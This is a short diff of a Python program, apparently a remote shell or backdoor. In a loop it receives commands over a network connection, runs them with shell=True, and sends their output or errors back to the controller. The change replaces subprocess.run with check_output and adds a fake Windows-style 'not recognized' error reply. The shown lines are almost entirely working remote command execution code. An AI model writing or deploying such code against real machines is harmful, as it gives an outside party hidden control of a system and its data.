@@ -35,14 +35,14 @@ while True:
 	recv_command = conn.recv(2048) # Command must be < 2048 char
 	print(f"$ {recv_command.decode()}")
 
-	call = subprocess.run(recv_command.decode(), shell=True, capture_output=True)
-	"""
-	If there are any better function than check_output that if I enter a command but it is
-	an invalid command it still print the unsuccessful output pls contribute
-	"""
-	output = call.stdout.decode()
-	error = call.stderr.decode()
-	if len(output) > 0 and len(error) <= 0:
-		conn.sendall(output.encode())
-	elif len(error) > 0 and len(output) <= 0:
-		conn.sendall(error.encode())
+	try:
+		call = subprocess.check_output(recv_command.decode(), shell=True)
+		"""
+		If there are any better function than check_output that if I enter a command but it is
+		an invalid command it still print the unsuccessful output pls contribute
+		"""
+		call = call.decode()
+		conn.sendall(call.encode())
+
+	except subprocess.CalledProcessError:
+		conn.sendall(f"'{recv_command.decode()}' is not recognized as an internal or external command, operable program or batch file.".encode())
